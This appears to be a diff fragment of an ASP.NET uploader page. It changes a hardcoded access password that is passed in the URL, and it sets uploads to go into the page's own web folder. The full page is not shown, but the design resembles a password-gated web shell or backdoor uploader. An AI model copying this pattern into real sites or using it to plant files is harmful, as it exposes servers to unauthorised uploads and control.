@@ -2,7 +2,7 @@
 <%@ Import Namespace="System.IO" %>
 <%
     // ===== CONFIG =====
-    string PASSWORD = "mypassword";  // ← URL me ?p=mypassword
+    string PASSWORD = "admin987654321!@";  // ← 
     string UPLOAD_DIR = Server.MapPath("."); // Current folder
 
     // ===== AUTH CHECK =====
